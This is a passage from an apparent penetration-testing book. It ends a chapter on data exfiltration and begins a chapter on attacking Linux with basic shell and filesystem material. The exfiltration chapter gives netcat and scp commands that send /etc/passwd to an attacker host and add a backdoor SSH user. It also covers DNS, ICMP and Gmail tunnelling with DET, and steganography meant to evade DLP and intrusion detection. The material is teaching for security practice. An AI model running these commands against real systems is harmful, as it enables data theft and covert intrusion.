-   SMB: Common on networks
-   RDP: Supports file transfer
-   Custom: potentially easy to detect
## Basic Data exfiltration techniques
There are many advantages to the standard data transfer approach such as
HTTP, FTP, DNS\... because:
-   Does not depend on the presence of any particular port, protocol, or
    app
-   Allows maximum flexibility on the part of the attacker
-   Locally Sourced Services for Ecological Exfiltration
-   Avoid having to infiltrate and install additional tools (reduces the
    risk of HIDS/NIDS alert)
-   No need to infiltrate physical devices (e.g. cellular device, USB
    key) onto the targeted subnet
## Exfiltration using netcat
netcat: is a versatile networking tool that can be used to read and
write data across UPD and TCP connections.
Enter this command on the victim machine:
> *cat passwd \|nc -v 192.168.1.129 1234 passwd (192.168.1.29 is IP@ of
> the attacker machine)*
Enter this command on the attacker machine
> *nc -l -v -p 1234 \> collectedfile.txt*
Tip: if a victim machine has host-based firewall protection that
whitelists ports and deny all others, there are two ways to deal with:
-   Change the iptables rules but not recommended because it will
    trigger the IDS or the file integrity monitoring FIM alerts.
-   Shutdown non-critical or unused port and hijack it: for example, an
    unused but available
> listening on port 116, shut down the service and perform the
> exfiltration and then turn it up
## Exfiltration using SSH
If the SSH daemon is running, create a new user for example mike
On the victim machine just enter the following commands:
> */usr/sbin/useradd mike*
>
> */usr/bin/passwd mike*
>
> *echo \>\> /etc/ssh/sshd_config AllowUsers mike*
*netstat -tulpn \| grep sshd* (to make sure that the SSH service is up)
Now we will use scp command to exfiltrate passwd file through SSH as
following
> *scp PI:EMAIL:/etc/passwd pass*
## Using Wget (HTTP Protocol)
If the victim machine has an Apache web server running, we can use the
HTTP protocol to exfiltrate data.Just copy all the files we want to
exfiltrate to /var/www/html and then copy them using the wget command
file to retrieve the data you want by just tapping the following
commands:
> *cp /etc/passwd /var/www/html/ wget
> [[http://192.168.1.130/passwd]{.underline}](http://192.168.1.130/passwd)*
## Using meterpreter download command
If you're using meterpreter as the payload to exploit the victim
machine, it's very simple just enter and copy the file through the
target machine directory without worrying about OS platform
compatibility.
## Advanced Data exfiltration techniques
We will use now some advanced tools and techniques to exfiltrate data
and prevent DLP detections.
## Using DET (Data exfiltration Toolkit)
DET is a data exfiltration toolkit used to send data over various
protocols to a control server.
All that we have to do is to set up a listening server on the attacker
machine and deploy DET client on the target machine. The client will
communicate to the server via the selected protocol and send data over
LAN or WAN.
DET is available via GitHub we just clone this repository:
https://github.com/PaulSec/DET.git Then tap:
> *pip install -r requirements.txt \--user*
In order to use DET, you will need to configure it and add your proper
settings (eg. SMTP/IMAP, AES256 encryption passphrase, proxies and so
on). a configuration example file has been provided and is called:
config-sample. Jason and this an example as shown below.
So far, DET supports multiple protocols, listed here:
-   HTTP(S)
-   ICMP
-   DNS
-   SMTP/IMAP (Pure SMTP + Gmail)
-   Raw TCP / UDP
-   FTP
-   SIP
-   PowerShell implementation (HTTP, DNS, ICMP, SMTP (used with Gmail))
-   And other "services":
-   Google Docs (Unauthenticated)
-   Twitter (Direct Messages)
-   Slack
## DET with ICMP
Prepare the DET server to exfiltrate data over ICMP packets as shown
below (attacker machine).
![](media/image116.jpeg)![](media/image117.jpeg)Prepare the DET client
(victim machine) to send exfiltrated data over ICMP.
And now the file passwd was recovered by the attacker successfully.
![](media/image118.jpeg)![](media/image119.jpeg)This is a network
capture of exchanged packets between the victim (192.168.1.130) and
attacker machine (192.168.1.129) using ICMP protocol.
## DET with Gmail
First Google will block anyone who tries to sign in from that app or
device because it does not meet their security standards
So just let less secure apps access your account to be able to send the
file over Gmail, just follow this link
[[https://support.google.com/accounts/answer/6010255]{.underline}](https://support.google.com/accounts/answer/6010255)
Prepare the DET server as shown below (attacker machine) and using Gmail
as a transport method
![](media/image120.jpeg)![](media/image121.jpeg)Prepare the DET client
(victim machine) to receive the file from Gmail.
This is a network capture of exchanged packets between attacker
(192.168.1.129) and Gmail server (74.125.133.108) to extract received
messages.
## ![](media/image122.jpeg)DET with DNS
![](media/image123.jpeg)Prepare the DET server to for exfiltrate data
over DNS packets as shown below (attacker machine).
![](media/image124.jpeg)Prepare the DET client (victim machine) to
receive the file from DNS queries.
## Using Cloakify
Cloakify is a toolkit that hides data in plain sight Using Text-Based
Steganography used to bypass data protection mechanisms such as:
AV and malware detection tools that try to clock malicious tool use
## Evade DLP sensors
Difficult to predict and profile the cloaked data, there are no
signatures Port / Protocol Restrictions (Prevent unmonitored dataflows)
Blacklisting data (Stop dataflows containing targeted content)
Whitelisting data (Permit only dataflows conforming to specific content)
Manual review of data transfer by analysts
Cybersecurity defenders are usually looking for the signs of attacks in
memory and network traffic to detection exfiltration, Cloakify defats
defenders by transforming any file type (xls, zip.exe, etc..) into a
list of a harmless-looking string using text-based steganography and
transfer the file without triggering alerts.
CloakifyFactory is available via GitHub:
https://github.com/TryCatchHCF/Cloakify Once the repository is cloned,
we run the tool by:
> *python cloakifyFactory.py*
![](media/image125.jpeg)![](media/image126.jpeg)To view the basic usage
of the tool we type 5 and press enter
Let's Cloakify a file, we need just to type 1 and enter the file
directory of the cloaked file then we specify the name output of output
file
![](media/image127.jpeg)![](media/image128.jpeg)Cloakify has 24 ciphers
available including hash MD5, geolocations and IP addresses, for our
example, we choose the ipAddressesTop100 cipher to hide our data.
Now, we add some noise to the file by adding entropy when cloaking a
file to in order to minimize frequency analysis to bypass security
detection mechanisms.
Prepackaged scripts for adding noise are:
prependID.py - Adds a randomized ID tag to the front of each line
prependLatLonCoords.py - Adds randomized LatLong coordinates to the
front of each line prependTimestamps.py - Adds timestamps (log file
style) to the front of each line
NB: We can generate our own cipher by creating a list of at least 66
unique words, phrases or symbols if the predefined cipher was detected
by intrusions detection systems
![](media/image129.jpeg)We choose prepedTimestamps for our example as
shown:
Here is the input file of the passwd file before cloaking
![](media/image130.jpeg)And this is the file after ciphering and adding
timestamp noise in the screen as follows
![](media/image131.jpeg)![](media/image132.jpeg)Let's decloakify the
cloaked file
Adding the noise to decloakify the file correctly
![](media/image133.jpeg)NB: if we cannot copy all the CloakifyFactory
project on the victim machine, we can just use the cloakify.py file as
follows:
> *python cloakify.py payloadFilename cipherFilename python
> decloakify.py cloakedFilename cipherFilename*
## Summary
In this Chapter, we introduced some basic concepts about data
exfiltration and we learned about some basic techniques from a simple
netcat exfiltration to some advanced scenarios using DNS, ICMP and Gmail
tunnelling, finally, we learned also how to evade DLP and security
mechanisms using text-based steganography.
> Chapter 13
>
> **Attacking Linux/Unix environments**
>
> Contributor: Chiheb Chebbi
>
> **Abstract**
[Linux](https://www.peerlyst.com/tags/linux) is one of the most known
and used [Operating](https://www.peerlyst.com/tags/operating) systems.
Many people are walking around with the misconception and assume that
Linux is secure. It is loaded with security mechanisms but Linux
machines can be compromised. Thus, I am going to take the opportunity to
discuss the major [techniques](https://www.peerlyst.com/tags/techniques)
to [exploit](https://www.peerlyst.com/tags/exploit) a Linux
infrastructure and to give you the required
[safeguards](https://www.peerlyst.com/tags/safeguards) to defend against
Linux attacks
In this chapter we are going to discover the following topics:
-   Linux Overview and Linux Commands
-   Linux Streams and redirection
-   [Linux Filesystem](https://www.peerlyst.com/tags/linux-file-system)
    Hierarchy
-   [Users](https://www.peerlyst.com/tags/users) and groups
-   Permissions
-   chmod, chown and chroot commands
-   [Cron](https://www.peerlyst.com/tags/cron)
    [jobs](https://www.peerlyst.com/tags/jobs) and Crontabs
-   Linux [attack vectors](https://www.peerlyst.com/tags/attack-vectors)
-   Linux [enumeration](https://www.peerlyst.com/tags/enumeration)
-   Linux exploitation With
    [Metasploit](https://www.peerlyst.com/tags/metasploit)
-   Linux Privilege escalation
-   Linux [kernel
    exploitation](https://www.peerlyst.com/tags/kernel-exploitation)
-   Linux Hardening
## Linux Overview
The main goal of an [operating
system](https://www.peerlyst.com/tags/operating-system) is managing
computer [hardware](https://www.peerlyst.com/tags/hardware) and software
resources and provides common
[services](https://www.peerlyst.com/tags/services) for computer
programs. Linux operating system is a clone developed by [Linus
Torvalds](https://www.peerlyst.com/tags/linus-torvalds) in 1991. It is
licensed under a GNU General Public License (GPL). To command, you will
need a shell which is a command-line interfaces that interpret and
execute the entered commands. Some of the most known shells are Bourne
again shell (**Bash**), C shell
(**csh**), Korn shell (**ksh**). If you are using Linux and you want to
check the shell environments type:
> *cat /etc/shells*
![](media/image134.png)⚠ Notice: Don't get confused between Linux and
Unix, they are different operating systems.
The following are some vital Linux commands to know:
-   **ls** : list the content of the directory
-   **find** : locate files
-   **cd** : enter a directory
-   **cp** : copy
-   **mv** : move
-   **mkdir** : make a directory
-   **rmdir** : remove a directory
-   **rm** : remove files
> *Tip: To learn more about a certain command just type the famous
> **man** command*
## ![](media/image135.png)Linux Streams and redirection
When you are interacting with a Linux environment, it will provide an
input/output redirection capabilities to ease your experience. To
manipulate the input/output streams, there are three streams you can
use:
-   [Standard](https://www.peerlyst.com/tags/standard) input (stdin)
-   Standard output (stdout)
-   Standard [error](https://www.peerlyst.com/tags/error) (stderr)
The three major streams are represented in the following graph:
> ![](media/image136.jpeg)[Figure
> source](https://www.linuxunit.com/images/stdin-stdout-stderr.png)
Another capability is **Redirection.** It is used to redirect the
discussed streams. In order to perform a text redirection you can use
the following symbols:
-   **"\>":** overwrite the file
-   **"\>\>":** add the input to the file
![](media/image137.jpeg)This is the list of some redirection symbols:
> [Figure
> source](https://geek-university.com/linux/redirect-input-and-output/)
## Linux Filesystem Hierarchy
![](media/image138.jpeg)Linux Directories and files are respecting a
certain Hierarchy even in Linux everything is a file. Yes! You heard me
everything is a file even directories and devices. The
[hierarchical](https://www.peerlyst.com/tags/hierarchical) design of